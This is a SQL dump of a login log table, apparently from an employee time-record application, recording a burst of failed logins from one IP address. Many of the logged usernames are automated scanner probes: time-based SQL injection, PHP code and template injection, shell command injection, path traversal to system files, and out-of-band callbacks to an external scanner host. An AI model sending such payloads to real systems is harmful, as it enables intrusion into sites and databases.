INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('204', '', '2023-05-08 03:41:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('205', '', '2023-05-08 03:41:04', '', 'Invalid username/password. Tried with: ${10000347+9999244}', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('206', '', '2023-05-08 03:41:04', '', 'Invalid username/password. Tried with: \"+response.write(9989429*9318760)+\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('207', '', '2023-05-08 03:41:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('208', '', '2023-05-08 03:41:04', '', 'Invalid username/password. Tried with: 1 waitfor delay \'0:0:15\' -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('209', '', '2023-05-08 03:41:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('210', '', '2023-05-08 03:41:04', '', 'Invalid username/password. Tried with: R1RwZmR3YWI=', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('211', '', '2023-05-08 03:41:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('212', '', '2023-05-08 03:41:04', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('213', '', '2023-05-08 03:41:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('214', '', '2023-05-08 03:41:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('215', '', '2023-05-08 03:41:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('216', '', '2023-05-08 03:41:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('217', '', '2023-05-08 03:41:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('218', '', '2023-05-08 03:41:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('219', '', '2023-05-08 03:41:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('220', '', '2023-05-08 03:41:05', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('221', '', '2023-05-08 03:41:05', '', 'Invalid username/password. Tried with: )', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('222', '', '2023-05-08 03:41:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('223', '', '2023-05-08 03:41:06', '', 'Invalid username/password. Tried with: !(()&&!|*|*|', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('224', '', '2023-05-08 03:41:06', '', 'Invalid username/password. Tried with: http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('225', '', '2023-05-08 03:41:06', '', 'Invalid username/password. Tried with: nGRXYw4B\'; waitfor delay \'0:0:15\' -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('226', '', '2023-05-08 03:41:06', '', 'Invalid username/password. Tried with: ^(#$!@#$)(()))******', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('227', '', '2023-05-08 03:41:06', '', 'Invalid username/password. Tried with: 1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('228', '', '2023-05-08 03:41:06', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('229', '', '2023-05-08 03:41:06', '', 'Invalid username/password. Tried with: Http://bxss.me/t/fit.txt', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('230', '', '2023-05-08 03:41:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('231', '', '2023-05-08 03:41:07', '', 'Invalid username/password. Tried with: http://bxss.me/t/fit.txt?.jpg', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('232', '', '2023-05-08 03:41:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('233', '', '2023-05-08 03:41:07', '', 'Invalid username/password. Tried with: /etc/shells', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('234', '', '2023-05-08 03:41:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('235', '', '2023-05-08 03:41:07', '', 'Invalid username/password. Tried with: c:/windows/win.ini', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('236', '', '2023-05-08 03:41:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('237', '', '2023-05-08 03:41:07', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('238', '', '2023-05-08 03:41:08', '', 'Invalid username/password. Tried with: bxss.me', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('239', '', '2023-05-08 03:41:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('240', '', '2023-05-08 03:41:08', '', 'Invalid username/password. Tried with: \'.gethostbyname(lc(\'hitwx\'.\'ktxsfiyjcac51.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(117).chr(66).chr(102).chr(', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('241', '', '2023-05-08 03:41:08', '', 'Invalid username/password. Tried with: Awk5YdZ1\' OR 707=(SELECT 707 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('242', '', '2023-05-08 03:41:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('243', '', '2023-05-08 03:41:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('244', '', '2023-05-08 03:41:08', '', 'Invalid username/password. Tried with: \".gethostbyname(lc(\"hityi\".\"pzylhwgz3d258.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(99).chr(85).chr(105).chr(7', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('245', '', '2023-05-08 03:41:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('246', '', '2023-05-08 03:41:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('247', '', '2023-05-08 03:41:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('248', '', '2023-05-08 03:41:08', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('249', '', '2023-05-08 03:41:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('250', '', '2023-05-08 03:41:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('251', '', '2023-05-08 03:41:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('252', '', '2023-05-08 03:41:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('253', '', '2023-05-08 03:41:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('254', '', '2023-05-08 03:41:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('255', '', '2023-05-08 03:41:09', '', 'Invalid username/password. Tried with: o4eO6nGz\') OR 422=(SELECT 422 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('256', '', '2023-05-08 03:41:09', '', 'Invalid username/password. Tried with: RDFYjolf<esi:include src=\"http://bxss.me/rpb.png\"/>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('257', '', '2023-05-08 03:41:09', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('258', '', '2023-05-08 03:41:10', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('259', '', '2023-05-08 03:41:10', '', 'Invalid username/password. Tried with: ;assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('260', '', '2023-05-08 03:41:10', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('261', '', '2023-05-08 03:41:10', '', 'Invalid username/password. Tried with: \';print(md5(31337));$a=\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('262', '', '2023-05-08 03:41:10', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('263', '', '2023-05-08 03:41:10', '', 'Invalid username/password. Tried with: \";print(md5(31337));$a=\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('264', '', '2023-05-08 03:41:10', '', 'Invalid username/password. Tried with: HttP://bxss.me/t/xss.html?%00', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('265', '', '2023-05-08 03:41:11', '', 'Invalid username/password. Tried with: ${@print(md5(31337))}', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('266', '', '2023-05-08 03:41:11', '', 'Invalid username/password. Tried with: bxss.me/t/xss.html?%00', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('267', '', '2023-05-08 03:41:11', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('268', '', '2023-05-08 03:41:11', '', 'Invalid username/password. Tried with: ${@print(md5(31337))}\\', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('269', '', '2023-05-08 03:41:11', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('270', '', '2023-05-08 03:41:11', '', 'Invalid username/password. Tried with: \'.print(md5(31337)).\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('271', '', '2023-05-08 03:41:11', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('272', '', '2023-05-08 03:41:11', '', 'Invalid username/password. Tried with: lPbi482v\')) OR 433=(SELECT 433 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('273', '', '2023-05-08 03:41:11', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('274', '', '2023-05-08 03:41:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('275', '', '2023-05-08 03:41:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('276', '', '2023-05-08 03:41:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('277', '', '2023-05-08 03:41:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('278', '', '2023-05-08 03:41:12', '', 'Invalid username/password. Tried with: \"+\"A\".concat(70-3).concat(22*4).concat(101).concat(74).concat(106).concat(81)+(require\"socket\"\nSocket.gethostby', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('279', '', '2023-05-08 03:41:12', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('280', '', '2023-05-08 03:41:12', '', 'Invalid username/password. Tried with: \'+\'A\'.concat(70-3).concat(22*4).concat(97).concat(75).concat(122).concat(87)+(require\'socket\'\nSocket.gethostbyn', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('281', '', '2023-05-08 03:41:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('282', '', '2023-05-08 03:41:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('283', '', '2023-05-08 03:41:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('284', '', '2023-05-08 03:41:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('285', '', '2023-05-08 03:41:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('286', '', '2023-05-08 03:41:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('287', '', '2023-05-08 03:41:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('288', '', '2023-05-08 03:41:13', '', 'Invalid username/password. Tried with: RDFYjolf\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('289', '', '2023-05-08 03:41:13', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('290', '', '2023-05-08 03:41:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('291', '', '2023-05-08 03:41:14', '', 'Invalid username/password. Tried with: 1\'\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('292', '', '2023-05-08 03:41:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('293', '', '2023-05-08 03:41:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('294', '', '2023-05-08 03:41:14', '', 'Invalid username/password. Tried with: 1%2527%2522', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('295', '', '2023-05-08 03:41:14', '', 'Invalid username/password. Tried with: check_dtr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('296', '', '2023-05-08 03:41:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('297', '', '2023-05-08 03:41:14', '', 'Invalid username/password. Tried with: @@9rwD6', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('298', '', '2023-05-08 03:41:14', '', 'Invalid username/password. Tried with: check_dtr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('299', '', '2023-05-08 03:41:14', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('300', '', '2023-05-08 03:41:15', '', 'Invalid username/password. Tried with: check_dtr/.', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('301', '', '2023-05-08 03:41:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('302', '', '2023-05-08 03:41:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('303', '', '2023-05-08 03:41:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('304', '', '2023-05-08 03:41:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('305', '', '2023-05-08 03:41:15', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('306', '', '2023-05-08 03:41:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('307', '', '2023-05-08 03:41:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('308', '', '2023-05-08 03:41:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('309', '', '2023-05-08 03:41:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('310', '', '2023-05-08 03:41:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('311', '', '2023-05-08 03:41:16', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('312', '', '2023-05-08 03:41:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('313', '', '2023-05-08 03:41:17', '', 'Invalid username/password. Tried with: \'\"()', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('314', '', '2023-05-08 03:41:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('315', '', '2023-05-08 03:41:17', '', 'Invalid username/password. Tried with: RDFYjolf\'&&sleep(27*1000)*cttksu&&\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('316', '', '2023-05-08 03:41:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('317', '', '2023-05-08 03:41:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('318', '', '2023-05-08 03:41:17', '', 'Invalid username/password. Tried with: RDFYjolf\"&&sleep(27*1000)*npmily&&\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('319', '', '2023-05-08 03:41:17', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('320', '', '2023-05-08 03:41:18', '', 'Invalid username/password. Tried with: RDFYjolf\'||sleep(27*1000)*zhuudd||\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('321', '', '2023-05-08 03:41:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('322', '', '2023-05-08 03:41:18', '', 'Invalid username/password. Tried with: RDFYjolf\"||sleep(27*1000)*qhshob||\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('323', '', '2023-05-08 03:41:18', '', 'Invalid username/password. Tried with: echo cmbroc$()\\ ygbvhv\\nz^xyu||a #\' &echo cmbroc$()\\ ygbvhv\\nz^xyu||a #|\" &echo cmbroc$()\\ ygbvhv\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('324', '', '2023-05-08 03:41:18', '', 'Invalid username/password. Tried with: &echo fqvmkz$()\\ actirq\\nz^xyu||a #\' &echo fqvmkz$()\\ actirq\\nz^xyu||a #|\" &echo fqvmkz$()\\ actirq\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('325', '', '2023-05-08 03:41:18', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
